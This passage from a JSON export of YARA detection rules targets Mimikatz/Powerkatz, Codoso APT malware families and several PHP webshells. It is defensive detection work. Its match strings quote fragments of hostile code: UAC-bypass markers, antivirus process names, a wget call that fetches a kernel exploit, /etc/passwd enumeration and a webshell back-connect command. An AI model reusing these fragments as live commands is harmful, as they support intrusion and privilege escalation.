\"kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x%08x)\" fullword wide\n      $c2 = \"kuhl_m_lsadump_getComputerAndSyskey ; kuhl_m_lsadump_getSyskey KO\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 1 of them ) or 2 of them\n}","date":"2016-02-05 11:46:21","description":"Detects Powerkatz - a Mimikatz version prepared to run in memory via Powershell (overlap with other Mimikatz versions is possible)","minimum_yara":"1.7","name":"Powerkatz_DLL_Generic_RID2F2F","reference":"PowerKatz Analysis","required_modules":[],"rule_hash":"64da045ef05b6f27216f9710c37786fd","score":80,"tags":["T1178","T1097","T1075","DEMO","T1086","FILE","T1003","GEN","EXE","HKTL"]},{"author":"Florian Roth","content":"rule Codoso_PGV_PVID_3_RID2CE8 : APT DEMO MAL {\n   meta:\n      description = \"Detects Codoso APT PGV PVID Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:09:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Copyright (C) Microsoft Corporation.  All rights reserved.(C) 2012\" fullword wide\n   condition: \n      $x1\n}","date":"2016-01-30 10:09:11","description":"Detects Codoso APT PGV PVID Malware","minimum_yara":"1.7","name":"Codoso_PGV_PVID_3_RID2CE8","reference":"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks","required_modules":[],"rule_hash":"39fdae689352b0e9377979baa644bfb2","score":75,"tags":["APT","DEMO","MAL"]},{"author":"Florian Roth","content":"rule Codoso_PlugX_3_RID2C59 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Codoso APT PlugX Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 09:45:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Cannot create folder %sDCRC failed in the encrypted file %s. Corrupt file or wrong password.\" fullword wide\n      $s2 = \"mcs.exe\" fullword ascii\n      $s3 = \"McAltLib.dll\" fullword ascii\n      $s4 = \"WinRAR self-extracting archive\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1200KB and all of them\n}","date":"2016-01-30 09:45:21","description":"Detects Codoso APT PlugX Malware","minimum_yara":"1.7","name":"Codoso_PlugX_3_RID2C59","reference":"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks","required_modules":[],"rule_hash":"517258b3800f860bde2b8db59ad3a8f6","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Codoso_PlugX_2_RID2C58 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Codoso APT PlugX Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 09:45:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%TEMP%\\\\HID\" fullword wide\n      $s2 = \"%s\\\\hid.dll\" fullword wide\n      $s3 = \"%s\\\\SOUNDMAN.exe\" fullword wide\n      $s4 = \"\\\"%s\\\\SOUNDMAN.exe\\\" %d %d\" fullword wide\n      $s5 = \"%s\\\\HID.dllx\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 3 of them ) or all of them\n}","date":"2016-01-30 09:45:11","description":"Detects Codoso APT PlugX Malware","minimum_yara":"1.7","name":"Codoso_PlugX_2_RID2C58","reference":"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks","required_modules":[],"rule_hash":"7c0891b7ecde320280fe3a0999cd45c9","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Codoso_CustomTCP_4_RID2DCC : APT DEMO EXE FILE MAL T1007 {\n   meta:\n      description = \"Detects Codoso APT CustomTCP Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:47:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1007\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"varus_service_x86.dll\" fullword ascii\n      $s1 = \"/s %s /p %d /st %d /rt %d\" fullword ascii\n      $s2 = \"net start %%1\" fullword ascii\n      $s3 = \"ping 127.1 > nul\" fullword ascii\n      $s4 = \"McInitMISPAlertEx\" fullword ascii\n      $s5 = \"sc start %%1\" fullword ascii\n      $s6 = \"net stop %%1\" fullword ascii\n      $s7 = \"WorkerRun\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 5 of them ) or ( $x1 and 2 of ( $s* ) )\n}","date":"2016-01-30 10:47:11","description":"Detects Codoso APT CustomTCP Malware","minimum_yara":"1.7","name":"Codoso_CustomTCP_4_RID2DCC","reference":"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks","required_modules":[],"rule_hash":"a9091c669a08690781265ee544cb29be","score":75,"tags":["T1007","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule Codoso_CustomTCP_3_RID2DCB : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Codoso APT CustomTCP Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:47:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"DnsApi.dll\" fullword ascii\n      $s2 = \"softWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\Domains\\\\%s\" ascii\n      $s3 = \"CONNECT %s:%d hTTP/1.1\" ascii\n      $s4 = \"CONNECT %s:%d HTTp/1.1\" ascii\n      $s5 = \"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0;)\" ascii\n      $s6 = \"iphlpapi.dll\" ascii\n      $s7 = \"%systemroot%\\\\Web\\\\\" ascii\n      $s8 = \"Proxy-Authorization: Negotiate %s\" ascii\n      $s9 = \"CLSID\\\\{%s}\\\\InprocServer32\" ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 5 of them ) or 7 of them\n}","date":"2016-01-30 10:47:01","description":"Detects Codoso APT CustomTCP Malware","minimum_yara":"1.7","name":"Codoso_CustomTCP_3_RID2DCB","reference":"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks","required_modules":[],"rule_hash":"c897622b6e3d8872838289ca239b4b5d","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Codoso_CustomTCP_2_RID2DCA : APT DEMO EXE FILE MAL T1007 {\n   meta:\n      description = \"Detects Codoso APT CustomTCP Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1007\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"varus_service_x86.dll\" fullword ascii\n      $s2 = \"/s %s /p %d /st %d /rt %d\" fullword ascii\n      $s3 = \"net start %%1\" fullword ascii\n      $s4 = \"ping 127.1 > nul\" fullword ascii\n      $s5 = \"McInitMISPAlertEx\" fullword ascii\n      $s6 = \"sc start %%1\" fullword ascii\n      $s7 = \"B_WKNDNSK^\" fullword ascii\n      $s8 = \"net stop %%1\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 406KB and all of them\n}","date":"2016-01-30 10:46:51","description":"Detects Codoso APT CustomTCP Malware","minimum_yara":"1.7","name":"Codoso_CustomTCP_2_RID2DCA","reference":"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks","required_modules":[],"rule_hash":"4fa1d49cc232579873942453b4ff6b61","score":75,"tags":["T1007","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule Codoso_PGV_PVID_6_RID2CEB : APT DEMO EXE FILE MAL T1085 {\n   meta:\n      description = \"Detects Codoso APT PGV_PVID Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:09:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"rundll32 \\\"%s\\\",%s\" fullword ascii\n      $s1 = \"/c ping 127.%d & del \\\"%s\\\"\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 6000KB and all of them\n}","date":"2016-01-30 10:09:41","description":"Detects Codoso APT PGV_PVID Malware","minimum_yara":"1.7","name":"Codoso_PGV_PVID_6_RID2CEB","reference":"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks","required_modules":[],"rule_hash":"f89c491439b2b95b22ec8dff6c671610","score":75,"tags":["MAL","DEMO","FILE","APT","T1085","EXE"]},{"author":"Florian Roth","content":"rule Codoso_Gh0st_2_RID2C2E : APT DEMO EXE FILE MAL T1085 {\n   meta:\n      description = \"Detects Codoso APT Gh0st Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 09:38:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"cmd.exe /c ping 127.0.0.1 && ping 127.0.0.1 && sc start %s && ping 127.0.0.1 && sc start %s\" fullword ascii\n      $s1 = \"rundll32.exe \\\"%s\\\", RunMeByDLL32\" fullword ascii\n      $s13 = \"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}\" fullword wide\n      $s14 = \"%s -r debug 1\" fullword ascii\n      $s15 = \"\\\\\\\\.\\\\keymmdrv1\" fullword ascii\n      $s17 = \"RunMeByDLL32\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 1 of them\n}","date":"2016-01-30 09:38:11","description":"Detects Codoso APT Gh0st Malware","minimum_yara":"1.7","name":"Codoso_Gh0st_2_RID2C2E","reference":"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks","required_modules":[],"rule_hash":"40e20a03cf14131b8c37cf4165175ed0","score":75,"tags":["MAL","DEMO","FILE","APT","T1085","EXE"]},{"author":"Florian Roth","content":"rule Codoso_CustomTCP_RID2D39 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Codoso CustomTCP Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:22:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"wnyglw\" fullword ascii\n      $s5 = \"WorkerRun\" fullword ascii\n      $s7 = \"boazdcd\" fullword ascii\n      $s8 = \"wayflw\" fullword ascii\n      $s9 = \"CODETABL\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 405KB and all of them\n}","date":"2016-01-30 10:22:41","description":"Codoso CustomTCP Malware","minimum_yara":"1.7","name":"Codoso_CustomTCP_RID2D39","reference":"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks","required_modules":[],"rule_hash":"48804fe32fbd66aed10af689fb8674dc","score":75,"tags":["DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Codoso_PGV_PVID_5_RID2CEA : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Codoso APT PGV PVID Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:09:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"/c del %s >> NUL\" fullword ascii\n      $s2 = \"%s%s.manifest\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and all of them\n}","date":"2016-01-30 10:09:31","description":"Detects Codoso APT PGV PVID Malware","minimum_yara":"1.7","name":"Codoso_PGV_PVID_5_RID2CEA","reference":"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks","required_modules":[],"rule_hash":"af012cf9fa6625b5d5b596bf1e952030","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Codoso_Gh0st_1_RID2C2D : APT DEMO EXE FILE MAL T1085 T1089 {\n   meta:\n      description = \"Detects Codoso APT Gh0st Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 09:38:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1085, T1089\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"cmd.exe /c ping 127.0.0.1 && ping 127.0.0.1 && sc start %s && ping 127.0.0.1 && sc start %s\" fullword ascii\n      $x2 = \"rundll32.exe \\\"%s\\\", RunMeByDLL32\" fullword ascii\n      $x3 = \"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}\" fullword wide\n      $x4 = \"\\\\\\\\.\\\\keymmdrv1\" fullword ascii\n      $s1 = \"spideragent.exe\" fullword ascii\n      $s2 = \"AVGIDSAgent.exe\" fullword ascii\n      $s3 = \"kavsvc.exe\" fullword ascii\n      $s4 = \"mspaint.exe\" fullword ascii\n      $s5 = \"kav.exe\" fullword ascii\n      $s6 = \"avp.exe\" fullword ascii\n      $s7 = \"NAV.exe\" fullword ascii\n      $c1 = \"Elevation:Administrator!new:\" wide\n      $c2 = \"Global\\\\RUNDLL32EXITEVENT_NAME{12845-8654-543}\" fullword ascii\n      $c3 = \"\\\\sysprep\\\\sysprep.exe\" fullword wide\n      $c4 = \"\\\\sysprep\\\\CRYPTBASE.dll\" fullword wide\n      $c5 = \"Global\\\\TERMINATEEVENT_NAME{12845-8654-542}\" fullword ascii\n      $c6 = \"ConsentPromptBehaviorAdmin\" fullword ascii\n      $c7 = \"\\\\sysprep\" fullword wide\n      $c8 = \"Global\\\\UN{5FFC0C8B-8BE5-49d5-B9F2-BCDC8976EE10}\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( 4 of ( $s* ) or 4 of ( $c* ) ) or 1 of ( $x* ) or 6 of ( $c* )\n}","date":"2016-01-30 09:38:01","description":"Detects Codoso APT Gh0st Malware","minimum_yara":"1.7","name":"Codoso_Gh0st_1_RID2C2D","reference":"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks","required_modules":[],"rule_hash":"1ec0a5233de3da78e24990102e7aa52c","score":75,"tags":["T1089","MAL","DEMO","FILE","APT","T1085","EXE"]},{"author":"Florian Roth","content":"rule Codoso_PGV_PVID_4_RID2CE9 : APT DEMO EXE FILE MAL T1050 {\n   meta:\n      description = \"Detects Codoso APT PlugX Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:09:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1050\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"dropper, Version 1.0\" fullword wide\n      $x2 = \"dropper\" fullword wide\n      $x3 = \"DROPPER\" fullword wide\n      $x4 = \"About dropper\" fullword wide\n      $s1 = \"Microsoft Windows Manager Utility\" fullword wide\n      $s2 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\\" fullword ascii\n      $s3 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Notify\" fullword ascii\n      $s4 = \"<assembly xmlns=\\\"urn:schemas-microsoft-com:asm.v1\\\" manifestVersion=\\\"1.0\\\"><trustInfo xmlns=\\\"urn:schemas-microsoft-com:asm.v3\" ascii\n      $s5 = \"<supportedOS Id=\\\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\\\"></supportedOS>\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and 2 of ( $x* ) and 2 of ( $s* )\n}","date":"2016-01-30 10:09:21","description":"Detects Codoso APT PlugX Malware","minimum_yara":"1.7","name":"Codoso_PGV_PVID_4_RID2CE9","reference":"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks","required_modules":[],"rule_hash":"aad90017d970742a8b4a6c1dbb2e99fb","score":75,"tags":["T1050","MAL","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule Codoso_PlugX_1_RID2C57 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Codoso APT PlugX Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 09:45:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"GETPASSWORD1\" fullword ascii\n      $s2 = \"NvSmartMax.dll\" fullword ascii\n      $s3 = \"LICENSEDLG\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of them\n}","date":"2016-01-30 09:45:01","description":"Detects Codoso APT PlugX Malware","minimum_yara":"1.7","name":"Codoso_PlugX_1_RID2C57","reference":"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks","required_modules":[],"rule_hash":"090a294c779e483207798a6a9fdd5d1e","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Codoso_PGV_PVID_2_RID2CE7 : APT DEMO EXE FILE MAL T1050 T1117 {\n   meta:\n      description = \"Detects Codoso APT PGV PVID Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:09:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1050, T1117\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SvcHost\" fullword ascii\n      $s1 = \"regsvr32.exe /s \\\"%s\\\"\" fullword ascii\n      $s2 = \"Help and Support\" fullword ascii\n      $s3 = \"netsvcs\" fullword ascii\n      $s9 = \"%SystemRoot%\\\\System32\\\\svchost.exe -k netsvcs\" fullword ascii\n      $s10 = \"winlogon\" fullword ascii\n      $s11 = \"System\\\\CurrentControlSet\\\\Services\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 907KB and all of them\n}","date":"2016-01-30 10:09:01","description":"Detects Codoso APT PGV PVID Malware","minimum_yara":"1.7","name":"Codoso_PGV_PVID_2_RID2CE7","reference":"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks","required_modules":[],"rule_hash":"71ed1da911b8adc4b985688cee96c054","score":75,"tags":["T1050","MAL","DEMO","EXE","FILE","APT","T1117"]},{"author":"Florian Roth","content":"rule Codoso_PGV_PVID_1_RID2CE6 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Codoso APT PGV PVID Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks\"\n      date = \"2016-01-30 10:08:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Cookie: pgv_pvid=\" ascii\n      $x2 = \"DRIVERS\\\\ipinip.sys\" fullword wide\n      $s1 = \"TsWorkSpaces.dll\" fullword ascii\n      $s2 = \"%SystemRoot%\\\\System32\\\\wiaservc.dll\" fullword wide\n      $s3 = \"/selfservice/microsites/search.php?%016I64d\" fullword ascii\n      $s4 = \"/solutions/company-size/smb/index.htm?%016I64d\" fullword ascii\n      $s5 = \"Microsoft Chart ActiveX Control\" fullword wide\n      $s6 = \"MSChartCtrl.ocx\" fullword wide\n      $s7 = \"{%08X-%04X-%04x-%02X%02X-%02X%02X%02X%02X%02X%02X}\" fullword ascii\n      $s8 = \"WUServiceMain\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and ( 1 of ( $x* ) or 3 of them ) ) or 5 of them\n}","date":"2016-01-30 10:08:51","description":"Detects Codoso APT PGV PVID Malware","minimum_yara":"1.7","name":"Codoso_PGV_PVID_1_RID2CE6","reference":"https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks","required_modules":[],"rule_hash":"ab3225ed535e8054ca44aab333c5cdbf","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Payload_Exe2Hex_RID2CB3 : DEMO SCRIPT T1064 {\n   meta:\n      description = \"Detects payload generated by exe2hex\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/g0tmi1k/exe2hex\"\n      date = \"2016-01-15 10:00:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, T1064\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"set /p \\\"=4d5a\" ascii\n      $a2 = \"powershell -Command \\\"$hex=\" ascii\n      $b1 = \"set+%2Fp+%22%3D4d5\" ascii\n      $b2 = \"powershell+-Command+%22%24hex\" ascii\n      $c1 = \"echo 4d 5a \" ascii\n      $c2 = \"echo r cx >>\" ascii\n      $d1 = \"echo+4d+5a+\" ascii\n      $d2 = \"echo+r+cx+%3E%3E\" ascii\n   condition: \n      all of ( $a* ) or all of ( $b* ) or all of ( $c* ) or all of ( $d* )\n}","date":"2016-01-15 10:00:21","description":"Detects payload generated by exe2hex","minimum_yara":"1.7","name":"Payload_Exe2Hex_RID2CB3","reference":"https://github.com/g0tmi1k/exe2hex","required_modules":[],"rule_hash":"707a426b0f3998308db999d34d06e37e","score":70,"tags":["DEMO","T1064","SCRIPT"]},{"author":"Florian Roth","content":"rule Webshell_AcidPoison_RID2E8F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects Poison Sh3ll - Webshell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 11:19:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"elseif ( enabled(\\\"exec\\\") ) { exec($cmd,$o); $output = join(\\\"\\\\r\\\\n\\\",$o); }\" fullword ascii\n   condition: \n      filesize < 550KB and all of them\n}","date":"2016-01-11 11:19:41","description":"Detects Poison Sh3ll - Webshell","minimum_yara":"1.7","name":"Webshell_AcidPoison_RID2E8F","reference":"https://github.com/nikicat/web-malware-collection","required_modules":[],"rule_hash":"4c95cf63e249a0be0f90bbe2cac45e98","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_r57shell_2b_RID2E8F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects Webshell R57\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 11:19:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$connection = @ftp_connect($ftp_server,$ftp_port,10);\" fullword ascii\n      $s2 = \"echo $lang[$language.'_text98'].$suc.\\\"\\\\r\\\\n\\\";\" fullword ascii\n   condition: \n      filesize < 900KB and all of them\n}","date":"2016-01-11 11:19:41","description":"Detects Webshell R57","minimum_yara":"1.7","name":"Webshell_r57shell_2b_RID2E8F","reference":"https://github.com/nikicat/web-malware-collection","required_modules":[],"rule_hash":"ac3ceefafcb233a1ab99ba90867ac7c0","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Backdoor_PHP_Agent_r57_mod_bizzz_shell_r57_RID3A88 : DEMO MAL T1100 WEBSHELL {\n   meta:\n      description = \"Detects Webshell - rule generated from from files Backdoor.PHP.Agent.php, r57.mod-bizzz.shell.txt ...\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 19:50:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, MAL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$_POST['cmd'] = which('\" ascii\n      $s2 = \"$blah = ex(\" fullword ascii\n   condition: \n      filesize < 600KB and all of them\n}","date":"2016-01-11 19:50:31","description":"Detects Webshell - rule generated from from files Backdoor.PHP.Agent.php, r57.mod-bizzz.shell.txt ...","minimum_yara":"1.7","name":"Webshell_Backdoor_PHP_Agent_r57_mod_bizzz_shell_r57_RID3A88","reference":"https://github.com/nikicat/web-malware-collection","required_modules":[],"rule_hash":"f23916ba63c407a61abd55a4ef5aacec","score":75,"tags":["T1100","DEMO","WEBSHELL","MAL"]},{"author":"Florian Roth","content":"rule Webshell_c100_RID2B9A : DEMO T1087 T1100 T1105 WEBSHELL {\n   meta:\n      description = \"Detects Webshell - rule generated from from files c100 v. 777shell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 09:13:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1087, T1100, T1105, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<OPTION VALUE=\\\"wget http://ftp.powernet.com.tr/supermail/debug/k3\\\">Kernel attack (Krad.c) PT1 (If wget installed)\" fullword ascii\n      $s1 = \"<center>Kernel Info: <form name=\\\"form1\\\" method=\\\"post\\\" action=\\\"http://google.com/search\\\">\" fullword ascii\n      $s3 = \"cut -d: -f1,2,3 /etc/passwd | grep ::\" ascii\n      $s4 = \"which wget curl w3m lynx\" ascii\n      $s6 = \"netstat -atup | grep IST\" ascii\n   condition: \n      filesize < 685KB and 2 of them\n}","date":"2016-01-11 09:13:31","description":"Detects Webshell - rule generated from from files c100 v. 777shell","minimum_yara":"1.7","name":"Webshell_c100_RID2B9A","reference":"https://github.com/nikicat/web-malware-collection","required_modules":[],"rule_hash":"1b68f3d546cb543d8bd0cec31ddd5343","score":75,"tags":["T1100","DEMO","WEBSHELL","T1087","T1105"]},{"author":"Florian Roth","content":"rule Webshell_27_9_acid_c99_locus7s_RID31FA : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects Webshell - rule generated from from files 27.9.txt, acid.php, c99_locus7s.txt\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 13:45:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$blah = ex($p2.\\\" /tmp/back \\\".$_POST['backconnectip'].\\\" \\\".$_POST['backconnectport'].\\\" &\\\");\" fullword ascii\n      $s1 = \"$_POST['backcconnmsge']=\\\"</br></br><b><font 